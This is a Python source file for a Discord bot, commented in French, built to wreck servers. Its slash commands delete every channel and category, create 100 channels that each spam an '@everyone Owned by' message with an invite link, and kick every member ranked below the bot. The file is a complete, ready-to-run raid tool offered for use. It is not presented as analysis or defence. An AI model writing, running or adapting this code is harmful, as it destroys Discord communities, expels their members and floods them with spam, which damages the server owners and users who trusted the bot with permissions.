import discord
from discord.ext import commands
import asyncio
import traceback
import nest_asyncio

nest_asyncio.apply()

TOKEN = ""  # ⚠️ Mets ton token ici

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

spamming = False
stop_spam = False

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Connecté en tant que {bot.user} (ID: {bot.user.id})")


async def clear_guild(guild):
    delete_channels = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*delete_channels, return_exceptions=True)

    delete_categories = [cat.delete() for cat in guild.categories]
    await asyncio.gather(*delete_categories, return_exceptions=True)

#spam + creation salon

async def create_and_spam_channel(guild, index):
    global stop_spam
    if stop_spam:
        return
    try:
        print(f"Création du salon bebebite-{index}")
        ch = await guild.create_text_channel(name=f"bebebite-{index}")
        print(f"Salon bebebite-{index} créé !")

        # Envoi 5 messages en parallèle dans ce salon
        send_tasks = [ch.send("@everyone Owned by ptite bite https://discord.gg/hdhVcsmD") for _ in range(5)]
        await asyncio.gather(*send_tasks)

    except Exception as e:
        print(f"[Erreur création canal {index}] {e}")
        traceback.print_exc()

async def launch_spam(guild):
    global stop_spam
    create_tasks = [create_and_spam_channel(guild, i) for i in range(100)]
    await asyncio.gather(*create_tasks)

#commande
@bot.tree.command(name="bebebite", description="Spam FULL SPEED sans limite")
async def bebebite(interaction: discord.Interaction):
    global spamming, stop_spam
    if spamming:
        await interaction.response.send_message("⚠️ Spam déjà en cours", ephemeral=True)
        return

    spamming = True
    stop_spam = False
    await interaction.response.send_message("🔥 Suppression en cours...", ephemeral=True)

    guild = interaction.guild
    await clear_guild(guild)

    await launch_spam(guild)

    spamming = False
    await interaction.followup.send("✅ Terminé", ephemeral=True)

@bot.tree.command(name="stop", description="Arrête le spam en cours")
async def stop(interaction: discord.Interaction):
    global stop_spam, spamming
    if spamming:
        stop_spam = True
        await interaction.response.send_message("⏹ Arrêt du spam demandé.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Aucun spam en cours.", ephemeral=True)

@bot.tree.command(name="clear", description="Supprime tous les salons et catégories, puis recrée 'keybbrox'")
async def clear(interaction: discord.Interaction):
    await interaction.response.send_message("🧹 Suppression en cours...", ephemeral=True)

    guild = interaction.guild

    delete_channels = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*delete_channels, return_exceptions=True)

    delete_categories = [cat.delete() for cat in guild.categories]
    await asyncio.gather(*delete_categories, return_exceptions=True)

    await guild.create_text_channel("keybbrox")

    await interaction.followup.send("✅ Tous les salons et catégories ont été supprimés et 'keybbrox' a été recréé.", ephemeral=True)

@bot.tree.command(name="ciao", description="Expulse tous les membres en-dessous du bot")
async def ciao(interaction: discord.Interaction):
    await interaction.response.send_message("👢 Expulsion des membres en cours...", ephemeral=True)

    bot_member = interaction.guild.me
    bot_top_role = bot_member.top_role

    kicked = 0
    failed = 0

    for member in interaction.guild.members:
        if member == bot_member or member.bot:
            continue

        try:
            if member.top_role.position < bot_top_role.position:
                await member.kick(reason="Expulsion via /ciao")
                kicked += 1
        except Exception as e:
            print(f"Erreur kick {member.display_name}: {e}")
            failed += 1

    await interaction.followup.send(
        f"✅ Expulsions terminées : {kicked} réussies, {failed} échouées.", ephemeral=True
    )

async def main():
    async with bot:
        await bot.start(TOKEN)

asyncio.run(main())